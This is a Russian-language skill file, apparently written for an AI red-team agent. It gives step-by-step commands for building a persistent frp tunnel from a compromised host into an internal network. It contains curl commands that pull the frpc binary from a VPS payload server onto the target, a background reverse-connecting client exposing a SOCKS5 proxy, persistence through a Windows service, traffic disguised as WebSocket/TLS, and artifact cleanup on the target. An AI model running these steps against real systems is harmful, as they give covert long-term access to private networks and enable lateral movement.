# frp (пробой во внутреннюю сеть, самый надёжный долгоживущий туннель)

> **Сначала загрузите конфигурацию VPS**: все `$REDTEAM_VPS_HOST` / `$VPS_USER` в этом навыке берутся из локальной конфигурации,
> при первом запуске их записывает `bash $DSH_HOME/redteam/setup.sh` в `$DSH_HOME/.env`. Перед каждой командой выполните source один раз:
> ```bash
> set -a; . "$DSH_HOME/.env" 2>/dev/null || . "$HOME/.dsh/.env"; set +a
> VPS_USER="${REDTEAM_VPS_USER:-ubuntu}"; VPS="$REDTEAM_VPS_HOST"
> ```
> Если ещё не настраивали, запустите один раз `setup.sh` (навык `redteam-setup`): он заодно проверит SSH-связность и сервис доставки payload.

`frp` — **самое стабильное и самое частое** решение для пробоя: на VPS запускается `frps` (сервер), на цели — `frpc` (клиент),
наружу выводится socks5 внутренней сети или любой порт. В отличие от suo5/chisel он **изначально рассчитан на долгую стабильную работу** (автопереподключение, мультиплексирование, TLS),
подходит для **долго висящего** канала во внутреннюю сеть после входа.

**Разделение**: есть WebShell → `suo5-tunnel`; только выполнение команд и нужно быстро войти во внутреннюю сеть → `chisel-tunnel`;
нужна **долгая стабильность + порт прямо пользователю** → этот навык.

## Бинарники на этой машине

| Файл | Путь | Назначение |
| --- | --- | --- |
| frps | `$DSH_HOME/redteam/toolkit/frp/frps` | Сервер на VPS |
| frpc | `$DSH_HOME/redteam/toolkit/frp/frpc` | Клиент на цели |

Уже синхронизировано в каталог payload на VPS `http://$REDTEAM_VPS_HOST:9100/`. На VPS также лежит пример конфигурации `frps`.

## 1. Сторона VPS: поднять frps (делать первым)

```bash
# 1) загрузить и подготовить (с этой машины → VPS)
scp -i $DSH_HOME/redteam/toolkit/vps/id_rsa \
    $DSH_HOME/redteam/toolkit/frp/frps $VPS_USER@$REDTEAM_VPS_HOST:/root/frps

# 2) записать конфигурацию (на VPS)
cat > /root/frps.toml <<'EOF'
bindPort = 7000                 # порт подключения frpc
auth.method = "token"
auth.token = "<случайный сильный token>"   # обязательно: при публичном доступе нужен token, иначе просканируют и будут пользоваться

# опционально: vhostHTTPPort / vhostHTTPSPort для пробоя по HTTP
EOF

# 3) запустить в tmux (разрыв SSH не должен убивать процесс)
tmux new -s frps
/root/frps -c /root/frps.toml
```

**Откройте в security group VPS**: `7000` (порт подключения frpc) + порты, которые затем пробрасываются (например `1080`, `13389`).

## 2. Сторона цели: запустить frpc

```bash
# 1) забрать бинарник (через уже имеющуюся точку выполнения команд)
curl -s http://$REDTEAM_VPS_HOST:9100/frpc -o /tmp/frpc && chmod +x /tmp/frpc

# 2) записать конфигурацию
cat > /tmp/frpc.toml <<'EOF'
serverAddr = "$REDTEAM_VPS_HOST"
serverPort = 7000
auth.method = "token"
auth.token = "<тот же token, что на frps>"

# ① SOCKS5 во внутреннюю сеть (полезнее всего: доступна вся внутренняя сеть)
[[proxies]]
name = "socks5"
type = "tcp"
remotePort = 1080
[proxies.plugin]
type = "socks5"

# ② проброс конкретного порта (пример: внутренний RDP → VPS 13389)
# [[proxies]]
# name = "rdp"
# type = "tcp"
# localIP = "10.0.0.5"
# localPort = 3389
# remotePort = 13389

# ③ опционально: тип HTTP (когда выход только через 80/443, вместе с vhostHTTPPort на frps)
# [[proxies]]
# name = "web"
# type = "tcp"
# localIP = "10.0.0.6"
# localPort = 8080
# remotePort = 18080
EOF

# 3) постоянная работа в фоне (nohup + автопереподключение при обрыве)
nohup /tmp/frpc -c /tmp/frpc.toml > /tmp/frpc.log 2>&1 &
# цель на Windows: frpc.exe -c C:\Windows\Temp\frpc.toml (для закрепления можно зарегистрировать службу через sc create)
```

## 3. Использование туннеля с этой машины

```bash
# режим SOCKS5: VPS:1080 и есть вход во внутреннюю сеть
proxychains4 -f runs/proxychains-1080.conf curl -s http://10.0.0.5/
# в конфиге укажите: socks5 $REDTEAM_VPS_HOST 1080
# ⛔ не правьте /etc/proxychains4.conf, используйте -f с временным конфигом из runs/

# режим проброса портов: подключаться напрямую к порту на VPS
rdesktop $REDTEAM_VPS_HOST:13389
mysql -h $REDTEAM_VPS_HOST -P 13306 -u root -p
```

## 4. Варианты при ограниченном выходе в сеть

| Ограничение | Решение |
| --- | --- |
| Разрешены только 80/443 | frps `bindPort = 443` (или сначала тип HTTP на 80), у frpc поменять порт соответственно |
| TLS-инспекция в промежутке | у frp есть `transport.tls.enable = true` (включено по умолчанию); при необходимости `transport.protocol = "kcp"` или `websocket` |
| Цель не имеет выхода в сеть | схема frp не подходит → туннель через WebShell (`suo5-tunnel`) |
| Нужно маскировать под обычный трафик | `transport.protocol = "websocket"` + `transport.tls.enable = true` (на 443 выглядит как обычный WebSocket) |

## 5. Закрепление и дисциплина

1. **Обязательно в tmux (сервер) / nohup (клиент)**, иначе при обрыве сессии туннель исчезнет.
2. **На сервере обязателен `auth.token`**: порт 7000 на публичном VPS сканируют все, без token это подарок внутренней сети.
3. **Не переиспользуйте token**: генерируйте новый случайный token на каждое учение; после работы вовремя закрывайте `pkill frps` / `pkill frpc`.
4. **На стороне цели следите за артефактами**: бинарник и конфиг — в `/tmp`, после работы удалять; на Windows — каталог `Temp`.
5. Начинайте работу сразу по цели, которую дал пользователь; если пользователь добавил область (например подсеть C, домен) — выполняйте по дополнению.

## 6. Вывод и запись в базу (обязательно)

1. **Регистрация туннеля `redteam_tunnel_add`**, все поля:
   - `kind`:`frp`;
   - `listen`: адрес, который реально использует пользователь (например `$REDTEAM_VPS_HOST:1080`);
   - `entry`: точка входа на стороне цели (например `/tmp/frpc на 10.0.0.6 → VPS:7000`);
   - `reach`: **фактически проверенная достижимая подсеть**;
   - `entry_kind`: **`target-outbound`** (цель выходит в сеть к нашему frps — типичная форма frp);
     ⛔ если прокси поднят только на своём VPS, ставится `self-only` → помечается как «не прорыв»;
   - `command`: полные команды для frps и frpc + ключевые моменты конфигурации (token замаскировать).
2. **Проверить связность**: `curl --socks5-hostname $REDTEAM_VPS_HOST:1080 http://<внутренняя цель>/`, регистрировать как active только после успеха;
   затем повторная проверка `redteam_session_check`.
3. **Оценка**: `boundary` (туннель достигает внутренней сети, в evidence «адрес туннеля｜достижимая подсеть｜внутренняя цель, до которой реально дошли»);
   латеральное перемещение через него → `server-host`.
4. **Передача пользователю**: дайте готовый к вставке `socks5://$REDTEAM_VPS_HOST:1080` или проброшенный порт, укажите адрес и порт.
5. Каждое ключевое действие — `redteam_chain_add` (`stage_code=boundary-logical`), в `tool` — текст команды, в `result` — выдержка вывода
   (например `frpc зарегистрирован, proxy socks5 start success`).
